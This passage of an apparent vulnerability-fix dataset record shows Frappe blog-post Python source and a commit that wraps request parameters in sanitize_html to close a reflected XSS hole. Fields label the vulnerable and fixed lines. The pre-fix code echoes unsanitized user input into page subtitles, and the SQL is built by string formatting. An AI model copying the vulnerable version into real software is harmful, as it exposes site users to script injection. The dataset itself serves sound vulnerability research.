\t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar \treturn posts ", "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n"}}, "msg": "fix(blog): Fix possible reflected XSS attack vector"}}, "https://github.com/kitechx/frappe": {"2fa19c25066ed17478d683666895e3266936aee6": {"url": "https://api.github.com/repos/kitechx/frappe/commits/2fa19c25066ed17478d683666895e3266936aee6", "html_url": "https://github.com/kitechx/frappe/commit/2fa19c25066ed17478d683666895e3266936aee6", "sha": "2fa19c25066ed17478d683666895e3266936aee6", "keyword": "XSS fix", "diff": "diff --git a/frappe/website/doctype/blog_post/blog_post.py b/frappe/website/doctype/blog_post/blog_post.py\nindex a20e9fa12..e4c757e64 100644\n--- a/frappe/website/doctype/blog_post/blog_post.py\n+++ b/frappe/website/doctype/blog_post/blog_post.py\n@@ -7,7 +7,7 @@\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n@@ -95,7 +95,7 @@ def get_list_context(context=None):\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n@@ -107,7 +107,7 @@ def get_list_context(context=None):\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n", "message": "", "files": {"/frappe/website/doctype/blog_post/blog_post.py": {"changes": [{"diff": "\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown"], "goodparts": ["from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html"]}, {"diff": "\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category"], "goodparts": ["\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)"]}, {"diff": "\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)"], "goodparts": ["\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))"]}], "source": "\n from __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar \treturn posts ", "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": 